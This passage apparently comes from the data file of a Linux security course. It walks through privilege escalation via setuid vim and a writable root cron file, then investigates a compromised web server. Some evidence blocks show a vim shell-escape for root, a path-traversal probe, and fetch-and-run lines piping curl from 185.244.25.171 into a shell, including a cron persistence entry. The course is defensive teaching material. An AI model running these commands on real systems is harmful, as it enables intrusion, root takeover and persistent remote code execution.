                      label: "Testing the setuid vim path",
                      code: `$ vim.basic -c ':!/bin/sh -p' -c ':q'
# id
uid=33(www-data) euid=0(root)`,
                    },
                    insight: "This is a real path. vim's ability to shell out, combined with the setuid bit, gives an effective-root shell. But check the other candidate before committing.",
                  },
                ),
                step(
                  "Examine the world-writable cron file",
                  "The backup-job cron file is mode 666 — writable by anyone, including www-data — and cron jobs in /etc/cron.d run as root. That is a second, independent path.",
                  {
                    evidence: {
                      label: "The cron file and how it runs",
                      code: `$ cat /etc/cron.d/backup-job
*/5 * * * * root /usr/local/bin/backup.sh

$ ls -la /etc/cron.d/backup-job
-rw-rw-rw- 1 root root 102 backup-job   # anyone can edit it`,
                    },
                    insight: "Because the file is writable, www-data can change what root runs every five minutes. Two independent escalation paths on one host — which is common, and which is why enumeration is thorough rather than stopping at the first hit.",
                  },
                ),
                step(
                  "Choose the quieter path and note both for the report",
                  "The setuid vim gives an immediate shell with no waiting and no persistence footprint. The cron path requires waiting up to five minutes and writing to a file that a defender might notice. For an attacker, vim is cleaner; for a defender, both must be fixed.",
                  {
                    evidence: {
                      label: "Both fixes",
                      code: `# remove the unexpected setuid bit
chmod u-s /usr/bin/vim.basic

# restrict the cron file to root
chmod 644 /etc/cron.d/backup-job`,
                    },
                    insight: "Fixing only the path you happened to use leaves the other open. A defender who found the vim escalation and stopped would still have a world-writable root cron job — enumeration has to be complete on both sides.",
                  },
                ),
              ],
            ),
            check(
              "The host had two escalation paths. What is the lesson for a defender who finds and fixes only the first one?",
              [
                "One fix is sufficient, since the attacker only needs one path blocked",
                "Independent escalation paths coexist, so fixing one leaves the host exploitable through the other",
                "The second path is only theoretical and can be ignored",
                "Finding any path means the host must be rebuilt entirely",
              ],
              1,
              "An attacker needs only one working path, so a defender must close all of them. Fixing the setuid vim while leaving a world-writable root cron file means the host is still trivially escalatable — which is exactly why enumeration continues past the first finding.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Final Assessment: Linux Security",
      description: "Investigate and secure a box.",
      lessons: [
        lesson(
          "Applied Investigation",
          "One compromised host, investigated end to end, using every skill from the course in sequence.",
          9,
          [
            text(
              "This is the whole course on one host. You have shell access to a web server that has been behaving oddly — occasional high load, and a report of an outbound connection to an unfamiliar address. Work it from first contact to a scoped conclusion.\n\nDecide your next command at each step before reading what was found.",
            ),
            walkthrough(
              "Investigating a compromised web server",
              "No alert tooling here — just a shell and the report of a suspicious connection. Everything you need is on the host; the skill is knowing where to look and in what order.",
              [
                step(
                  "Orient, then follow the reported connection to a process",
                  "Start with who is on the box and what is talking to the network. The report was about an outbound connection, so tie that connection to its process first.",
                  {
                    evidence: {
                      label: "Orientation and the network view",
                      code: `$ w
deploy   pts/0  185.244.25.171  02:13  -bash

$ ss -tp state established
ESTAB  10.20.4.9:44120  185.244.25.171:443  users:(("nginx",pid=31882))`,
                    },
                    insight: "The connection is owned by a process claiming to be nginx, and the deploy user is logged in from the same external address the connection goes to. Both threads point at 185.244.25.171.",
                  },
                ),
                step(
                  "Inspect the process — the name is a lie",
                  "A process named nginx making an outbound beacon is suspicious. Check what it actually is through /proc rather than trusting the name in the process list.",
                  {
                    evidence: {
                      label: "What the process really is",
                      code: `$ ls -la /proc/31882/exe
/proc/31882/exe -> '/tmp/.x (deleted)'

$ ps -o ppid= -p 31882 | xargs ps -o cmd= -p
/bin/sh -c curl 185.244.25.171/s | sh`,
                    },
                    insight: "The real binary is a deleted file in /tmp, and its parent was a shell running a piped download. The 'nginx' name was set by the attacker to blend into the process list.",
                  },
                ),
                step(
                  "Find how they got in",
                  "The parent was a shell spawned from the web stack. Check the web server logs around the process start time for the request that triggered it.",
                  {
                    evidence: {
                      label: "nginx access log at process start",
                      code: `02:07:41 185.244.25.171 POST /upload.php
  "....//....//etc/passwd" 200
02:08:02 185.244.25.171 POST /upload.php
  file=shell.php.jpg 200`,
                    },
                    insight: "A path-traversal probe followed by a disguised file upload. The web application was the entry point, at 02:08 — that is the start of the timeline.",
                  },
                ),
                step(
                  "Establish how they became root",
                  "The process runs as www-data, but you need to know whether they escalated. Run the same enumeration an attacker would.",
                  {
                    evidence: {
                      label: "Escalation check",
                      code: `$ find / -perm -4000 -type f -newermt '2026-08-06' 2>/dev/null
/usr/bin/find

$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 320K Aug  6 02:14 /usr/bin/find`,
                    },
                    insight: "find gained the setuid bit at 02:14, six minutes after entry. setuid-root find is an instant root shell, so from 02:14 the attacker had root.",
                  },
                ),
                step(
                  "Enumerate every persistence mechanism before removing any",
                  "Now root, the attacker will have planted persistence — and typically more than one. Check all the locations before touching anything.",
                  {
                    evidence: {
                      label: "Persistence found",
                      code: `/etc/cron.d/backup    * * * * * root curl 185.244.25.171/b | bash
/etc/systemd/system/app-update.service   → downloads /tmp/.x
/home/deploy/.ssh/authorized_keys        → attacker key added 02:15`,
                    },
                    insight: "Three mechanisms — cron, a systemd service, and an SSH key — all tied to the same address. Removing any one leaves the other two, so all must go together.",
                  },
                ),
                step(
                  "Write the timeline and contain in the right order",
                  "Timeline: web exploit via upload.php at 02:08, reverse shell as www-data, setuid-find escalation to root at 02:14, three persistence mechanisms and an added SSH key by 02:15, beaconing to 185.244.25.171 throughout. Isolate the host from the network without powering off, kill the process, remove all three persistence mechanisms and the SSH key, reset the setuid bit on find, and rebuild if the intrusion's full extent cannot be established.",
                  {
                    insight: "Six minutes from web exploit to root, one more to persistence. The report was a single odd connection; the reality was a fully compromised host — which is why one thread, pulled properly, is enough.",
                  },
                ),
              ],
            ),
            text(
              "Every skill from the course appeared: orienting on an unfamiliar host, tying a connection to a process, seeing through a faked process name via /proc, reading web logs for the entry point, enumerating setuid binaries for the escalation, and checking every persistence location before cleanup.\n\nNone of it needed a tool beyond the shell. It needed knowing where evidence lives and the order to look, which is the whole course.",
            ),
            check(
              "The investigation began from a single reported connection and uncovered a full compromise. What made that possible?",
              [
                "A security product had already flagged every stage",
                "Tying the connection to its process, then following the evidence backward to entry and forward to persistence",
                "The attacker left an obvious ransom note",
                "The host had verbose debug logging enabled everywhere",
              ],
              1,
              "One connection was the thread. Tying it to a process, seeing through the faked name via /proc, tracing back to the web exploit and forward through escalation to persistence is the method — each artefact pointing at the next, all of it available from a shell.",
            ),
          ],
        ),
      ],
    },
  ],
};
